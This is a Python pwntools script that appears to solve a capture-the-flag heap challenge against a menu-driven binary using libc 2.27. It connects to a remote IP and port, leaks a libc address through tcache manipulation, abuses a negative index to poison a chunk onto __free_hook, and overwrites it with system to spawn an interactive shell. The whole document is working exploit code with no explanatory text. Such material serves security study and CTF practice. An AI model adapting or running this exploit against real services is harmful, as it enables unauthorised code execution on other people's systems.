from pwn import*
context.log_level = 'DEBUG'
def menu(ch):
	p.sendlineafter('Your choice: ',str(ch))
def new(index,size):
	menu(1)
	p.sendlineafter('Index: ',str(index))
	p.sendlineafter('Size: ',str(size))
def edit(index,content):
	menu(2)
	p.sendlineafter('Index: ',str(index))
	p.send(content)
def show(index):
	menu(3)
	p.sendlineafter('Index: ',str(index))
def free(index):
	menu(4)
	p.sendlineafter('Index: ',str(index))

p = process('./main')
p = remote('122.112.212.41',6666)
libc = ELF('./libc-2.27.so')
for i in range(8):
	new(i,0xF8)
for i in range(8):
	free(7 - i)
for i in range(7):
	new(i + 1,0xF8)
new(0,0x78)
show(0)
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - 0x10 - libc.sym['__malloc_hook'] - 336
log.info('LIBC:\t' + hex(libc_base))
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']
new(8,0x78)
new(14,0)
new(15,0)
free(15)
new(-2,0x1FF)
edit(14,'\x00'*0x18 + p64(0x21) + p64(free_hook) + '\n')
new(15,0x10)
edit(15,'/bin/sh\x00\n')
new(13,0x10)
edit(13,p64(system) + '\n')
free(15)
p.interactive()
